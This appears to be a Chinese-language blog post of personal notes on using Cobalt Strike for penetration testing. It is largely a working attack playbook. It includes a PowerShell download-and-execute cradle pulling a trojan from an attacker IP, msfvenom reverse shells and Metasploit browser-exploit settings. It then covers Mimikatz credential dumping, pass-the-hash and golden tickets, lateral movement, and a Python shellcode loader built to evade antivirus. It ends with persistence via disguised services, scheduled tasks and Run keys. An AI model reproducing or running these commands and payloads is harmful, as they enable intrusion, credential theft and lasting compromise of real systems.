---
title: cobaltstrike
date: 2020-11-06 10:28:40
tags: 渗透测试
---

# Cobaltstrike

# 一、基础使用

```
./teamserver 192.168.43.224 123456 启动服务器端
在windows下的链接
双击bat文件即可
在linux下
./start.sh
```

让目标机器链接上teamserver

```
1.设置好监听器
2.生成攻击载荷
	url它是个文件路径，就是让目标（受害者）通过地址下载恶意脚本
	powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.43.224:80/a'))"
	http://192.168.43.224/a这是一段木马
	就是使用powershell来进行下载代码并且运行
3.攻击
```

## 二、Cobalt Stike使用重定器

第一保护服务器地址，并作为攻击者，它也是一个很好的安全操作。第二 它给予了一些很好的适应能力，假如工具中有一两个堵塞了也没有什么大不了的，也可以进行通信。

```
socat TCP4-LISTEN:80,fork TCP4:team.cskali.com:80 将监听道德80端口的数据转发到teamserve的80端口上
```

在监听的host设置上来，应该设置为分机的host上的80端口，因为已经做了转发，可以直接设置。

然后再设置beacon时，相当于几个备用的接口。

注意DNS

的设置（当然在公网环境下买的没有这个需求）

## 三、DNS Beacon的使用与原理

DNS木马隐蔽性好，在受害者不会开放任何端口，可以有效地规避防火墙协议，走的是53端口

**分类**

```
windows/beacon_dns.resrve_http(传输数据小)
beacon_dns/reserve_http（支持命令切换模式 mode dns)速度很慢，但非常隐蔽
beacon_dns/reserve_dns_txt(支持命令切换模式： mode dns_txt) 传输数据量更大，推荐使用
windows/beacon_dns/reverse_dns_txt（传输数据打）
```

域名创建a记录test.1377day.com指向teamserver

接着创建三个ns记录 分别为C1,C2,C3指向test.1377day.com

进入beacon 打开help

```
使用checkin命令来进入尝试数据连续返回，发一些基本信息回来
```

## 四、用户驱动攻击

```
sleep + 数字 调节屏幕暗的时间
```

## 五、派生会话

派生会话，选择好监听器，会选择执行，在选择ip的时候，选择的是新的主机的ip`192.168.0.134`但是beacons依然选择原来的teamserver，新建一个会话的监听。

1.派生会话（自身增加会话，或者给其他的teamserver）

2.派生metasploit会话

首先还是新建一个监听器，tcp/ip，选择`windows/foreign/reverse_tcp`这个payload，然后主机设置你的metasploit监听的端口，主机，确保一致，

4.metasplot生成木马与cobalt strike会话

```
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.104 LPORT=8808 -f exe > /tmp/shell1.exe
```

注意在添加监听器的时候，要选择http的监听模式，不要搞错了，这个很重要。这个就是host:192.168.0.104,port:8808的监听模式。

把msf生成的木马拿到肉鸡上去执行就会返回一个会话，也可以使用

5.metasploit使用溢出exp与cobalt strike会话

```
use exploit/windows/browser/ms14_064_ole_code_execution
set srvhost 192.168.0.134 这是teamserver
set SRVPORT 80
set payload windows/meterpreter/reverse_http
set LHOST 192.168.0.104 本地监听的localhost，就是黑客电脑
set lport 8888
set disablepayloadhandler True
set PrependMigrate true
set lhost 80
exploit
```

将`DisablePayLoadHandler`设置为true。这告诉metasploit框架，它不需要在metasploit框架内创建处理程序来服务有效负载连接。就是让cobalt strike来处理。

`set PrependMigrate true`

这个选项告诉metasploit框架修改其stager，以便在利用之后立即迁移到另一个进程。此选项对于客户端攻击非常重要。它允许您的会话在被利用的应用程序崩溃或关闭时存活。

当xp系统的受害人用浏览器访问http://192.168.0.134:80/1Gk97z32pr 这个带有攻击代码的链接时候，成功的话就会在cobalt strike 产生一个会话

`sessions -i + ID`

```
use exploit/windows/local/payload_inject
set session 3
set payload windows/meterpreter/reverse_http
set lhsot 192.168.0.104
set lport 8888
set DisablePayloadHandler true
exploit -j
```

将这个sessions分配个cobaltstrike.

`会话的协议，一定要对应，不然会一直报错的。`

# 六、钓鱼攻击

## 生成后门

1.html文件运行钓鱼病毒

2.宏病毒

## 钓鱼攻击

收集用户浏览器客户端的信息，web管理模块，可以查看现在能使用的web模块

## 克隆网站

进行攻击

进行键盘记录

下载执行木马

## meatsploit溢出攻击配合cobal

命令一敲万事大吉

```
use exploit/windows/browser/ms14_064_ole_code_execution
set srvhost 192.168.0.134
set SRVPORT 888
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.134
exploit
```

http://192.168.0.134:888/tsGoWgaV4P9NW

将上面的url地址放入到克隆网站的攻击网址里面 当受害人访问http://192.168.0.134:80/msf 就会加载http://192.168.0.134:888/tsGoWgaV4P9NW

# 七、鱼叉钓鱼攻击

1.准备要钓鱼的目标邮箱

2.模版文件

在准备账号密码的时候，账号和密码之间一定要使用两下`tab`键

3.smtp发送邮箱

# 八、权限提升

UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。

常用的权限提升方式

```
bypassuac
```

**使用ms14-058提权**

在里面使用cmd命令的时候，使用`shell whoami`

`whiami/groups`查看用户权限和用户组的信息

smb-pipe beacon 推荐内网环境下使用

**powershell提权**

需要收集自己的提权脚本进行使用

`powershell-import 导入脚本`

`powershell Invoke-AllChecks`开始扫描

然后`icacls 查看权限 F完全控制`一定要有完全的F权限才行

增加用户系统用户

`powershell Install-ServiceBinary -ServiceName Protect_2345Explorer -UserName rockyou123455 -Password 123456`

spawnas `.`(这是域)  然后使用账号密码，来获得一个新的beacon，然后就可以bypassuac获取超级权限

运行mimikatz

# 九、域内渗透（画好拓扑图）

## 1.枚举信任主机

### 1.1 windows命令

派生会话使用`smp`payload更适合用于做内网渗透

`shell whoami/groups`  查看在用户组中的用户权限

`shell whoami` 查看用户权限

`shell net user`查看本地的主机用户

`shell net view /domain`查看共有多少个域在本地

`net view /domain:TEST1` 查看当前域主机列表，（后面的TEST1时在上条命令中的主机名字）

`shell ping` + `上一步查看的主机名 `查看ip

`net group \\server2003 /domain` 查看域内成员computer的名字

`nltest /dclist:TEST1`查看域控 （如果报错说没有这个命令，那么就是因为powershel这种x86环境下是没有的）

**解决办法**：`shell c:\windows\sysnative\nltest /dclist:test1`

`nltest /domain_trusts` 查看域的信任关系

### 1.2  powerView 模块的使用

先使用powershell-import 进行模块的引入

`powershell Invoke-Netview` 将常用的信息显示出来

`powershell Invoke-ShareFinder` 查找共享的

`powershell Invoke-MapDomainTrusts`查看信任关系的

### 1.3 net模块

`net dclist`  列出域控

`net dclist [domain]` 列出目标共享列表

`net share \\DATABASE` 列出当前域控的主机 双斜杠后面是名字

net view 查看域内主机

net view [domain]

## 2   判断当前用户位置

### 2.1 判断是否本地管理员

```
因为 普通域用户 在做一些高级别操作的配置 需要域管理员的账号和密码。这是很不方便的。有的时候就会把普通的域用户 把它增加目标主机的超级管理员组，那么再做配置的时候就不需要域的超级管理员账号和密码。
```

`shell dir \\目标机器名\C$`如果本地用户是不会死目标机器码`本地`管理员，这里就可以成功访问，不然就会没有权限

如果能看，就是某一台机子的`本地`超级管理员

`powerview Invoke-FindLocalAdminAccess`也可以采用这个模块的方法 查看信任主机里是不是其超级管理员

### 2.2 判断是否是域内管理员

`shell net group "enterprise admins" /domain `查询域内管理员是

`shell net group "domain admins" /domain`

`shell net localgroup "administrators" /domain `

beacon下的命令

`net group \\dc`查看dc的组

`net localgroup \\dc “admin”`  查找一下dc的`admin`组，要注意其中的权限分配，还有就是查询的速度会很慢，耐住性子

powerview 

`powershell Get-NetLocalGroup -HostName database1`查看database1的本地用户组

### 2.3 winrm执行powershell

本条基于所渗透的主机是本地的超级管理员

`shell dir database1 \C$` 查看database1的c盘目录

`shell dir /S /B  \\database1\c$\users` 查看曾经登录过的用户，`这个目录下信息含量很大`

`powershell Invoke-Command -ComputerName database1 -ScriptBlock{ dir c:\}`这里就相当于使用powershell执行cmd命令 ，有可能因为链接不是很稳定，导致执行命令出错

powershell Invoke-Command -ComputerName database1 -ScriptBlock{ net localgroup administrators}

这些命令都是在伤害着这台机子上执行的

### 2.4 powersploit 运行MImikatz

`powershell-import invoke-MImikatz.ps1 `导入该内网渗透神器

`powershell Invoke-Mimikatz -ComputerName database1 `

## 3 登录验证

### 3.1 制作凭证（必须要系统权限system）

用mimikatz收集到的密码 用凭证制作一个标记，制作成临时身份。

`rev2self` 终止标记  （这是beacon命令，恢复原来的令牌【token】）

访问域控主机

`steal_token ID` 域控主机的超级管理员进程（ID是超级管理员进程）

`make_token TEST1\Aadminstrator 123456` 制作token

`make_token domain\user password `domain可以生成本地的，代码是一个点

`spawnas domain\user password `再生成一个会话

## 4 hash验证

### 4.1 散列认证

`pth TEST1\username NTLM`

### 4.2 kerberos凭证认证

**画个重点**

```
Kerberos和密码散列认证有些不一样，但是两者同样都是使用凭据来产生标记
Kerberos票证是存储存在一个叫kerberos托盘的地方
Kerberos原理是你们可以使用一个中间人 它叫 密匙分配发送服务器 并且 密匙分配发送服务器出凭据，你们可能现在使用那个凭据一次性与服务器相互作用他会告诉服务器，我很好 这是我凭据 验证凭据这个中间人如果信任它会给我服务器的凭据 这个凭据就可以让我们保持交互 并且没有任何帐号建立 如果你们获取了一个凭据 那就集成它，然后你们就可以使用这个指定凭据来与服务器进行交互了。一般情况下我使用凭据最好使用黄金凭据。
黄金凭据是域管理员自己生成的Kerberos凭据 来用mimikatz伪造一个黄金票证 
```

有了黄金票据就有了访问域控权限限 ，通常用于后门。
		你们需要四个不同的信息。
		`用户 、域名、域id  krbtgt 的hash`

首先 `shell c:\windows\sysnative\klist` 查看本地的票据

`shell whoami/user`获取域的id

```
列举黄金票据
shell klist
64位置
shell c:\windows\sysnative\klist
kerberos_ccache_use       从ccache文件中导入票据应用于此会话
kerberos_ticket_purge     清除当前会话的票据
kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话 
```

## 5 代码执行

方法一

```
先制作一个exe后门
然后上传到当前用户的文件夹下面
然后使用copy命令拷贝到被受信任的主机中
shell copy D:/user/admin.a.exe \\database1\C$\WINDOWS\TEMP\http.exe
shell sc \\host create name binpath= C$\WINDOWS\TEMP\http.exe
shell sc \\host start name
shell sc \\host delete name
当前执行的权限是什么返回的权限就是什么
```

方法二

```
前面的上传复制命令不变
shell net time \\host
shell at \\host 15:14 c:\path\to\bad.exe  15时14分启动服务
```

转发监听器 内网的特殊情况 kali和域控不在一个ip段内，不能相互交互，所以要用到转发监听器

## 6 自动化操作

首先查找本地的管理员，`Invoke-FindLocalAdminAccess`，然后登陆，偷取临时token。

# 十 隧道的使用



![image-20201114233421704](https://i.loli.net/2020/12/27/kiTg7XEpjVRWQN4.png)

这是整个过程的拓扑图。

**1.scok转发**

正向链接扫描的方式

`sock + port`开启sock转发

`sock + stop`关闭sock转发

更改kali上的proxychains的配置文件实现代理转发

这里是不能够使用PING扫描方式的。nmap -Pn -sT 10.10.10.4

**2.metasploit在beacon使用 隧道转发** 

```php
可以发送信息 和接收信息的 
setg Prosies socks4:127.0.0.1:[port]
setg Proxies socks4:192.168.0.134:21743
setg ReverseAllowProxy true 允许反向代理
unsetg Proxies
```

![image-20201114234802809](https://i.loli.net/2020/12/27/rupVESfDtGv3eao.png)

最好再开一台kali来链接，不要和teamserver相同。

# 十一 ssh隧道在beacon中的使用

使用beacon的机器，直接与teamserver交互的主机

![image-20201115081115868](https://i.loli.net/2020/12/27/kfrRjZW3mVuFg76.png)

当前是不能够链接的，这里的ubuntu是有他的账号和密码，现在是在ubuntu上做一个隧道，让他进行转发到win7上去。

在teamsever上开发一个1080端口，链接到154的机器上。然后win7的机器将445端口的数据全都转发。

ssh -D创建一个动态的端口链接到154，这一步在teaserver上来执行。`ssh -D 1080 webper@192.168.0.154`

`socat TCP-LISTEN:445,fork SOCKS4:127.0.0.1:10.10.10.129:445`然后我们的beacon是通过smb端口进行的，就是445端口，我们对于445端口访问就变成了对129的445端口的访问。

![image-20201115082538994](https://i.loli.net/2020/12/27/kfrRjZW3mVuFg76.png)

# 十二 使用多种方法免杀payload

### 1.HanzoInjection 方法

​    `HanzoInjection.exe -e payload_meterpreter.bin`bin是二进制文件，最好不要使用64位的payload，因为很多的免杀文件都不支持64位的文件。

![image-20201115090819014](https://i.loli.net/2020/12/27/V4Dmhs5zy7vqp2f.png)

https://github.com/P0cL4bs/hanzoInjection

### 2.Invoke-PSImage

下载地址:https://github.com/peewpw/Invoke-PSImage

```bash
Powershell -ExecutionPolicy Bypass 允许导入脚本

Import-Module .\Invoke-PSImage.ps1 导入脚本

Invoke-PSImage -Script .\payload.ps1 -Image .\test.jpg –Out test2.png –Web
```

用cs生成payload payload.ps1 、

然后会给你一段利用的代码，这个时候选择生成的图片用cs做一个文件下载，然后选择那个图片，将其中的url替换一下，然后执行即可

## 3.python免杀

生成payload,注意不要选择64位，一定要选32位

模版

```
from ctypes import *
import ctypes
# length: 614 bytes
buf = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\xe8\x80\x00\x00\x00\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x4d\x53\x43\x4f\x4d\x29\x00\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x00\x59\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x61\x5a\x48\x89\xc1\x41\xb8\xd2\x04\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x44\x48\x89\xc1\x48\x31\xd2\x41\x58\x4d\x31\xc9\x52\x68\x00\x02\x60\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1d\x48\xff\xcf\x74\x10\xeb\xdf\xeb\x63\xe8\xb7\xff\xff\xff\x2f\x53\x39\x70\x61\x00\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\xc3\xe8\x35\xff\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x36\x31\x2e\x31\x36\x30\x00"
#libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr: 
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()   
if whnd != 0:
       if 1:
              ctypes.windll.user32.ShowWindow(whnd, 0)   
              ctypes.windll.kernel32.CloseHandle(whnd)
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()

```

```
https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download
https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
https://github.com/pyinstaller/pyinstaller/releases
 
安装python2.7 
增加环境变量
安装生成exe的库
Python setup.py install
不能带有中文路径否则出错
Pip install pyinstaller
生成exe文件
pyinstaller -F bb.py
```

# 十三 C2的使用

使用:`./teasmserver [ip][password][/patch/profile]` 

profiles的参数讲解

```
选项关键词
jitter控制beacon的不稳定的抖动时间
maxdns 控制dns的最大访问次数
sleeptime 控制beacon的睡眠间隔时间
spawnto 指定派生的名字
uri 请求的url
useragent  每次攻击时的浏览器头信息
除了设置Malleable C2的选项外，还能增加任意的http头信息增加到beacon中进行交互通信。
增加任意指定的参数的命令
header "header" "value"
parameter "key" "value"
```

**c2lint的使用**

检测他的配置文件是否是正确的。

参考文档：

https://github.com/rsmudge/Malleable-C2-Profiles

https://blog.cobaltstrike.com/2018/06/04/broken-promises-and-malleable-c2-profiles/

https://www.cobaltstrike.com/help-malleable-c2

# 十四  Aggressor-scripts的使用

修改默认端口

就是在teamserver的启动程序中，将`-port`的参数改成想要的端口即可

修改端口 默认的端口可能会被蓝队溯源 得到ip个端口 或者被ids检测到。

# 十五 可持续后门的使用

1.服务自动启动（会被防火墙拦截）

```
sc create "Windows Power" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(' http://192.168.0.150:80/a'))\""
sc config "Windows Power" start= auto
sc description "Windows Power" "windows auto service" 增加描述
net start "Windows Power"
sc delete "Windows Power"
这个程序如果免杀的话，360就不会拦截
sc create "server power" binpath= "C:\Users\Administrator\Desktop\artifact.exe"
sc description "server power" "description" 设置服务的描述字符串
sc config "server power" start= auto 设置这个服务为自动启动
net start "server power" 启动服务
```

2.计划任务

```
创建任务
schtasks /create /tn "windowsup" /tr "C:\artifact.exe" /ru SYSTEM /sc onstart
删除任务
schtasks /delete /tn windowsup
查询任务 
chcp 437 解决这个问题 错误: 无法加载列资源。 s 请修改字符集
schtasks /query /tn windowsup
手工运行任务 
schtasks /run /tn windowsup
```

3.注册表启动

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ /d "C:\artifact.exe" /f
```

## 十六 Veil 免杀过杀软

链接:https://github.com/Veil-Framework/Veil

 https://www.cnblogs.com/-qing-/p/11031699.html

https://www.veil-framework.com/

use 1 选择调试

![image-20201115165248669](https://i.loli.net/2020/12/27/TGupeDrFVBkPUgv.png)